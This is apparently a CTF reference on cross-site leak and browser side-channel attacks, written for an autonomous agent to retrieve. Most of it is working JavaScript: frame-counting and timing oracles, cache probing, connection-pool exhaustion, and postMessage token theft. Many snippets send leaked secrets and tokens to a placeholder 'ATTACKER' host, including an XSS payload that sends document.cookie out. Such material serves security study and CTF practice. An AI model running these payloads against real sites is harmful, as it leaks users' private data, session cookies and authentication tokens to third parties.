# XS-Leak and Browser Side-Channel Techniques - CTF Reference

> **Document Purpose:** Actionable cross-site leak (XS-Leak) and browser side-channel techniques for CTF challenges. Covers frame counting, timing attacks, error-based oracles, cache probing, connection pool exhaustion, postMessage confusion, and Content-Type differentiation for autonomous agent retrieval.

---

## 1. XS-Leak Fundamentals

> **When to use this section:** You need to infer information about a cross-origin page without directly reading its content. XS-Leaks exploit browser side-channels to create boolean oracles.

**Tags:** `xs-leak, side-channel, browser-exploit, cross-origin, fundamentals`

**What Are XS-Leaks:**
- Techniques that exploit browser behavior differences to leak cross-origin information
- Work by observing side-effects: timing, error events, frame counts, cache state
- Do not require XSS or direct content access; they infer data from observable browser state
- Typically used when SOP prevents direct reading but observable side-effects vary based on page content

**Common CTF Scenario:**
- An authenticated endpoint returns different responses based on a secret (e.g., search results, user existence)
- Attacker page opens/iframes the target and observes side-effects
- Each observation yields one bit of information (boolean oracle)
- Repeated queries reconstruct the secret character by character

**Prerequisites:**
- Victim visits attacker-controlled page (admin bot in CTFs)
- Target endpoint behavior varies based on secret data
- No strong framing protections (X-Frame-Options, frame-ancestors) for frame-based leaks
- SameSite=None cookies or cookie-less authentication for cross-site requests

---

## 2. Frame Counting (window.length)

> **When to use this section:** The target page renders a different number of iframes depending on the response content (e.g., search results, conditional rendering).

**Tags:** `xs-leak, frame-counting, window-length, iframe, boolean-oracle`

**Concept:** `window.length` returns the number of frames in a window. A cross-origin opener can read this property despite SOP, creating an oracle based on iframe count differences.

**Basic Frame Count Oracle:**
```javascript
// Attacker page
function checkFrameCount(url) {
    return new Promise(resolve => {
        const w = window.open(url);
        // Wait for page to load
        setTimeout(() => {
            const count = w.length;  // Number of iframes - readable cross-origin!
            w.close();
            resolve(count);
        }, 2000);
    });
}

// Example: search endpoint that shows results in iframes
async function leak() {
    // If user "admin" exists, page shows 1 iframe with profile; 0 if not
    const count = await checkFrameCount('https://target.com/search?q=admin');
    if (count > 0) {
        // User "admin" exists
        fetch('https://ATTACKER/leak?user=admin&exists=true');
    }
}
```

**Iframe-Based (No Popup):**
```html
<iframe id="probe" src="https://target.com/search?q=test"></iframe>
<script>
document.getElementById('probe').onload = function() {
    // window.frames[0].length is readable cross-origin
    const count = this.contentWindow.length;
    fetch(`https://ATTACKER/leak?frames=${count}`);
};
</script>
```

**CTF Application - Character-by-Character Search Leak:**
```javascript
async function leakSecret() {
    const charset = 'abcdefghijklmnopqrstuvwxyz0123456789_{}';
    let known = 'flag{';

    for (let pos = known.length; pos < 50; pos++) {
        for (const c of charset) {
            const guess = known + c;
            const url = `https://target.com/search?q=${encodeURIComponent(guess)}`;
            const count = await checkFrameCount(url);
            if (count > 0) {  // Search returned results
                known = guess;
                fetch(`https://ATTACKER/progress?known=${encodeURIComponent(known)}`);
                break;
            }
        }
        if (known.endsWith('}')) break;
    }
}
```

**Limitations:**
- Requires the target page to have a varying number of iframes/frames
- X-Frame-Options or CSP frame-ancestors blocks iframe-based approaches
- `window.open` may be blocked by popup blockers (admin bots usually allow it)

---

## 3. Timing-Based Leaks

> **When to use this section:** The target endpoint has measurably different response times depending on the data being queried (e.g., a search that takes longer with more results).

### 3.1 performance.now() Timing

**Tags:** `xs-leak, timing-attack, performance-now, response-time, side-channel`

**Basic Cross-Origin Timing:**
```javascript
async function timeRequest(url) {
    const start = performance.now();
    try {
        // Use fetch in no-cors mode to measure timing without reading response
        await fetch(url, { mode: 'no-cors', credentials: 'include' });
    } catch (e) {
        // Error still gives us timing info
    }
    const end = performance.now();
    return end - start;
}

// Leak based on response time difference
async function oracleCheck(guess) {
    const url = `https://target.com/api/check?value=${guess}`;
    const times = [];
    // Multiple measurements for accuracy
    for (let i = 0; i < 5; i++) {
        times.push(await timeRequest(url));
    }
    const median = times.sort()[Math.floor(times.length / 2)];
    return median;
}
```

**Image Timing (Bypass fetch Restrictions):**
```javascript
function timeImage(url) {
    return new Promise(resolve => {
        const img = new Image();
        const start = performance.now();
        img.onload = () => resolve(performance.now() - start);
        img.onerror = () => resolve(performance.now() - start);
        img.src = url;
    });
}
```

### 3.2 SharedArrayBuffer Timing

**Tags:** `xs-leak, timing-attack, sharedarraybuffer, high-resolution, timer`

**Concept:** SharedArrayBuffer with Atomics provides a high-resolution timer unaffected by browser timer precision reduction (which was introduced as a Spectre mitigation).

**Requirements:** The attacking page must be served with:
```
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
```

**High-Resolution Timer Setup:**
```javascript
// Main thread
const sab = new SharedArrayBuffer(4);
const counter = new Int32Array(sab);

// Worker increments counter continuously
const workerCode = `
    const counter = new Int32Array(self.sab);
    while (true) { Atomics.add(counter, 0, 1); }
`;

const blob = new Blob([workerCode], { type: 'application/javascript' });
const worker = new Worker(URL.createObjectURL(blob));
worker.postMessage({ sab });

// Read high-res timestamp
function now() {
    return Atomics.load(counter, 0);
}

// Use in timing attack
const start = now();
await fetch(url, { mode: 'no-cors', credentials: 'include' });
const elapsed = now() - start;
```

**Note:** Most CTFs that require SharedArrayBuffer timing will provide the necessary COOP/COEP headers on the attacker page.

---

## 4. Error-Based Oracles

> **When to use this section:** The target returns different HTTP status codes or content types depending on the queried data, and you can detect errors via event handlers.

### 4.1 Image/Script Error Events

**Tags:** `xs-leak, error-event, onerror, onload, status-code, oracle`

**Concept:** When loading a cross-origin resource as an image or script, `onload` fires if the response is valid (200 with correct content type) and `onerror` fires otherwise. This leaks the response status/type.

**Image Error Oracle:**
```javascript
function probeExists(url) {
    return new Promise(resolve => {
        const img = new Image();
        img.onload = () => resolve(true);   // 200 with image content
        img.onerror = () => resolve(false);  // 404 or non-image response
        img.src = url;
    });
}

// Leak: does user X exist?
const exists = await probeExists('https://target.com/avatar/admin.png');
fetch(`https://ATTACKER/leak?admin_exists=${exists}`);
```

**Script Error Oracle:**
```javascript
function probeScript(url) {
    return new Promise(resolve => {
        const script = document.createElement('script');
        script.onload = () => resolve('loaded');
        script.onerror = () => resolve('error');
        script.src = url;
        document.head.appendChild(script);
    });
}
```

### 4.2 Fetch Error Handling

**Tags:** `xs-leak, fetch-error, opaque-response, status-code, redirect`

**Redirect Detection:**
```javascript
async function detectRedirect(url) {
    try {
        const resp = await fetch(url, {
            mode: 'no-cors',
            credentials: 'include',
            redirect: 'error'  // Throws on redirect
        });
        return false;  // No redirect
    } catch (e) {
        return true;  // Redirect occurred
    }
}

// Leak: is user logged in? (authenticated users get 200, others get 302)
const loggedIn = !(await detectRedirect('https://target.com/dashboard'));
```

**Content-Length Oracle via Timing:**
```javascript
// Larger responses take longer; compare response times
const timeWithResults = await timeRequest('https://target.com/search?q=a');
const timeNoResults = await timeRequest('https://target.com/search?q=zzzzz');
// Significant time difference indicates result count differs
```

---

## 5. Cache Probing / Timing Attacks

> **When to use this section:** You can detect whether a resource is in the browser cache, leaking whether the victim previously visited a URL or loaded a specific resource.

**Tags:** `xs-leak, cache-probing, timing-attack, browser-cache, visited`

**Concept:** Cached resources load faster than uncached ones. By measuring load time, you can determine if the victim's browser has a resource cached, revealing browsing history or authenticated state.

**Cache Timing Probe:**
```javascript
async function isCached(url) {
    // First, ensure the resource is NOT in our cache
    // (use cache-busting or Cache-Control: no-cache)

    const start = performance.now();
    const img = new Image();
    await new Promise(resolve => {
        img.onload = resolve;
        img.onerror = resolve;
        img.src = url;
    });
    const elapsed = performance.now() - start;

    // Cached resources typically load in < 5ms; network requests take > 50ms
    return elapsed < 20;
}
```

**Cache Probing via Performance API:**
```javascript
function checkCachedResource(url) {
    // PerformanceResourceTiming entries reveal transfer size
    const entries = performance.getEntriesByName(url);
    if (entries.length > 0) {
        const entry = entries[0];
        // transferSize === 0 means served from cache
        return entry.transferSize === 0;
    }
    return null;  // Not loaded yet
}
```

**Two-Stage Cache Probe (Evict then Check):**
```javascript
async function probeCache(url) {
    // Stage 1: Load the resource to populate PerformanceResourceTiming
    const img = new Image();
    img.src = url;
    await new Promise(r => { img.onload = r; img.onerror = r; });

    // Stage 2: Check if it was served from cache
    const entries = performance.getEntriesByName(url);
    const entry = entries[entries.length - 1];
    if (entry && entry.transferSize === 0) {
        return true;  // Was cached (victim visited before)
    }
    return false;  // Not cached
}
```

---

## 6. History Sniffing via :visited

> **When to use this section:** You need to detect whether the victim has visited specific URLs. Modern browsers severely limit this, but some techniques still work.

**Tags:** `xs-leak, history-sniffing, visited, css, privacy`

**Modern Limitations (Post-2010):**
- Browsers restrict `:visited` to color-related properties only (`color`, `background-color`, `border-color`, `outline-color`, `column-rule-color`, `fill`, `stroke`)
- `getComputedStyle()` lies about `:visited` styles, always returning unvisited values
- Cannot use `url()` in `:visited` rules

**Pixel-Based :visited Detection (Limited but Possible):**
```html
<style>
a:visited { color: rgb(255, 0, 0); }
a:link { color: rgb(0, 0, 255); }
</style>
<a id="probe" href="https://target.com/admin">test</a>
```

**Canvas-Based History Sniffing (Older Technique):**
```javascript
// BLOCKED in modern browsers - included for historical reference
// Some older admin bots may still be vulnerable
const link = document.createElement('a');
link.href = 'https://target.com/admin';
link.textContent = 'X';
document.body.appendChild(link);

// In old browsers, you could draw the link to canvas and read pixel color
// Modern browsers always report the unvisited color via getComputedStyle
```

**Note:** `:visited` attacks are largely mitigated in modern browsers. In CTFs, this is usually a red herring unless the challenge explicitly uses an older browser engine.

---

## 7. Connection Pool Exhaustion

> **When to use this section:** You need a boolean oracle and other XS-Leak techniques are blocked. This technique uses browser connection limits as a side-channel.

**Tags:** `xs-leak, connection-pool, socket-exhaustion, boolean-oracle, timing-attack`

**Concept:** Browsers limit the number of concurrent connections per origin (typically 6 for HTTP/1.1) and globally (~256). By saturating the connection pool and then making a probe request, you can detect timing differences based on whether a cross-origin request completes quickly (cached/blocked) or slowly (waiting for a connection).

**Basic Connection Pool Oracle:**
```javascript
async function exhaustPool() {
    // Open maximum connections to a slow server
    const blockers = [];
    for (let i = 0; i < 255; i++) {
        blockers.push(
            fetch(`https://slow-server.attacker.com/hang?id=${i}`, {
                mode: 'no-cors'
            }).catch(() => {})
        );
    }
    // Pool is now exhausted
    return blockers;
}

async function probeWithExhaustedPool(url) {
    const blockers = await exhaustPool();

    const start = performance.now();
    try {
        await fetch(url, {
            mode: 'no-cors',
            credentials: 'include',
            signal: AbortSignal.timeout(500)
        });
    } catch (e) {}
    const elapsed = performance.now() - start;

    // If target response was already cached or blocked, it resolves fast
    // If it needs a new connection, it blocks waiting for a free socket
    return elapsed;
}
```

**Boolean Oracle Construction:**
```javascript
// If endpoint returns 200 for valid guess, 404 for invalid:
// 200 response may be cached from previous request, completing instantly
// 404 may not be cached, requiring a socket and blocking
async function oracleGuess(char) {
    const url = `https://target.com/check?char=${char}`;

    // Pre-warm: load once normally to cache valid responses
    await fetch(url, { mode: 'no-cors', credentials: 'include' });

    // Exhaust pool
    await exhaustPool();

    // Probe: cached (valid) responses return fast, uncached block
    const time = await probeWithExhaustedPool(url);
    return time < 100;  // Fast = cached = valid guess
}
```

---

## 8. Content-Type XS-Leak

> **When to use this section:** The target endpoint returns different Content-Type headers (e.g., `text/html` vs `application/json`) depending on the query, and you can exploit this difference.

**Tags:** `xs-leak, content-type, mime-type, script-load, json-html`

**Concept:** When loading a URL as a `<script>`, the browser attempts to parse it as JavaScript. HTML content will throw a syntax error, while certain JSON responses might be valid JavaScript (e.g., arrays). This creates a detectable oracle.

**Script-Based Content-Type Detection:**
```javascript
function detectContentType(url) {
    return new Promise(resolve => {
        const script = document.createElement('script');

        script.onload = () => {
            resolve('valid-js');  // Response parsed as valid JS
            script.remove();
        };

        script.onerror = () => {
            resolve('invalid-js');  // Response was blocked or invalid JS
            script.remove();
        };

        // For more precise detection, use error messages
        window.onerror = function(msg, src, line, col, error) {
            if (msg.includes('SyntaxError')) {
                resolve('html-or-text');  // HTML content causes syntax error
            }
            return true;
        };

        script.src = url;
        document.head.appendChild(script);
    });
}
```

**JSON Array Detection:**
```javascript
// JSON arrays like [1,2,3] are valid JS expressions
// JSON objects like {"key": "val"} cause SyntaxError (block parsed as label)
// This difference can be used as an oracle

// Override Array constructor to capture leaked data
const original = Array;
Array = function() {
    // JSON array data leaked here!
    fetch(`https://ATTACKER/leak?data=${JSON.stringify(arguments)}`);
    return new original(...arguments);
};
```

**MIME Type Sniffing Oracle:**
```javascript
// Object/embed elements have different behavior based on content type
function detectMimeType(url) {
    return new Promise(resolve => {
        const obj = document.createElement('object');
        obj.data = url;
        obj.onload = () => resolve('renderable');  // HTML, images, etc.
        obj.onerror = () => resolve('non-renderable');  // JSON, binary
        document.body.appendChild(obj);
    });
}
```

---

## 9. postMessage Origin Confusion

> **When to use this section:** The target application uses `postMessage` for cross-origin communication and has insufficient origin validation.

**Tags:** `xs-leak, postmessage, origin-confusion, cross-origin, message`

**Concept:** Applications that use `postMessage` without properly verifying `event.origin` can be tricked into sending sensitive data to attacker-controlled windows, or accepting malicious data from them.

**Intercepting Leaked Data:**
```javascript
// If target posts messages without checking the receiver
window.addEventListener('message', function(event) {
    // Capture any messages sent by the target
    fetch(`https://ATTACKER/leak?origin=${event.origin}&data=${encodeURIComponent(JSON.stringify(event.data))}`);
});

// Open target in iframe (if allowed)
const iframe = document.createElement('iframe');
iframe.src = 'https://target.com/page-that-posts-messages';
document.body.appendChild(iframe);
```

**Exploiting Missing Origin Check:**
```javascript
// Vulnerable target code:
// window.addEventListener('message', function(e) {
//     if (e.data.action === 'getToken') {
//         e.source.postMessage({token: secret_token}, '*');  // Sends to ANY origin!
//     }
// });

// Attacker exploitation:
const w = window.open('https://target.com/vulnerable-page');
setTimeout(() => {
    w.postMessage({ action: 'getToken' }, '*');
}, 2000);

window.addEventListener('message', function(e) {
    // Receive the secret token
    fetch(`https://ATTACKER/stolen?token=${e.data.token}`);
});
```

**Injecting Malicious Data:**
```javascript
// If target processes messages without origin check:
// window.addEventListener('message', function(e) {
//     document.getElementById('output').innerHTML = e.data.content;  // XSS!
// });

const target = document.getElementById('target-iframe').contentWindow;
target.postMessage({
    content: '<img src=x onerror=fetch("https://ATTACKER/?c="+document.cookie)>'
}, '*');
```

**Common Vulnerable Patterns:**
```javascript
// NO origin check at all
window.addEventListener('message', handler);

// Weak origin check (substring match)
if (event.origin.indexOf('trusted.com') !== -1) { ... }
// Bypassed with: attacker-trusted.com

// Regex without anchoring
if (/trusted\.com/.test(event.origin)) { ... }
// Bypassed with: http://trusted.com.attacker.com
```

---

## 10. Combined XS-Leak Strategies

> **When to use this section:** Planning a multi-technique XS-Leak approach for complex CTF challenges.

**Tags:** `xs-leak, strategy, combined, methodology, ctf`

**Decision Tree for Technique Selection:**
```
1. Can you iframe the target?
   YES -> Frame counting (window.length)
   NO  -> Continue

2. Does the response time vary measurably?
   YES -> Timing attack (performance.now / SharedArrayBuffer)
   NO  -> Continue

3. Does the status code vary (200 vs 404)?
   YES -> Error event oracle (img/script onerror)
   NO  -> Continue

4. Does the Content-Type vary?
   YES -> Script load / MIME detection oracle
   NO  -> Continue

5. Does the response affect caching?
   YES -> Cache probing
   NO  -> Continue

6. Does the target use postMessage?
   YES -> postMessage interception / origin confusion
   NO  -> Continue

7. Last resort: Connection pool exhaustion
   -> Works for any boolean difference in response behavior
```

**Multi-Bit Leak via Binary Search:**
```javascript
// Instead of brute-forcing each character, use binary search
async function binarySearchChar(position, low, high, oracle) {
    if (low >= high) return String.fromCharCode(low);
    const mid = Math.floor((low + high) / 2);
    // Oracle: does the character at `position` have code > mid?
    const result = await oracle(position, mid);
    if (result) {
        return binarySearchChar(position, mid + 1, high, oracle);
    } else {
        return binarySearchChar(position, low, mid, oracle);
    }
}
```

---

## 11. Common CTF Patterns

> **When to use this section:** Solving XS-Leak challenges in CTF competitions.

**Tags:** `xs-leak, ctf, patterns, admin-bot, oracle`

**Pattern 1: Search-Based Leak with Frame Counting**
```
Challenge: Internal search endpoint returns results only for admin
Setup: Admin bot visits your page while authenticated
Goal: Leak admin's search history or flag via search results
Technique: window.open target search with each character guess,
           count frames to detect result presence
```

**Pattern 2: Status-Code Oracle for Blind Flag Leak**
```
Challenge: API endpoint returns 200 if query matches flag prefix, 404 otherwise
Setup: Admin bot visits attacker page with credentials
Technique: <img src="https://target/check?flag=flag{a"> onerror/onload to detect status
```

**Pattern 3: Cache Probing Authentication State**
```
Challenge: Detect if admin has accessed a specific resource
Setup: Attacker page probes browser cache for target resources
Technique: Measure load time of target resources; cached = previously visited
```

**Pattern 4: postMessage Token Theft**
```
Challenge: SPA sends auth token via postMessage to parent window
Setup: Open target in iframe/popup from attacker page
Technique: Listen for postMessage events, exfiltrate token data
```

**Pattern 5: Connection Pool Timing Oracle**
```
Challenge: No other XS-Leak vectors available; need boolean oracle
Setup: Saturate browser connection pool with held connections
Technique: Probe target; response time reveals cached vs. uncached state
```

---

## 12. Agent Takeaway

> - XS-Leaks are the go-to technique when same-origin policy prevents direct content reading but observable side-effects exist
> - Frame counting (`window.length`) is the simplest and most reliable XS-Leak; try it first
> - Error-based oracles (`img onerror/onload`) are effective when status codes differ between match/no-match
> - Timing attacks require multiple measurements (5-10 samples) to be reliable; use median not mean
> - SharedArrayBuffer provides high-resolution timing but requires COOP/COEP headers on the attacker page
> - Cache probing is powerful but increasingly mitigated by cache partitioning in modern browsers
> - postMessage origin confusion is a common CTF vulnerability; always check for missing or weak origin validation
> - Connection pool exhaustion is a last resort but works against any endpoint with observable response differences
> - Always start with the simplest technique and escalate: frame count -> error events -> timing -> cache -> connection pool
> - In CTF admin-bot scenarios, the bot runs Chromium and will have cookies; `credentials: 'include'` is needed for cross-site requests
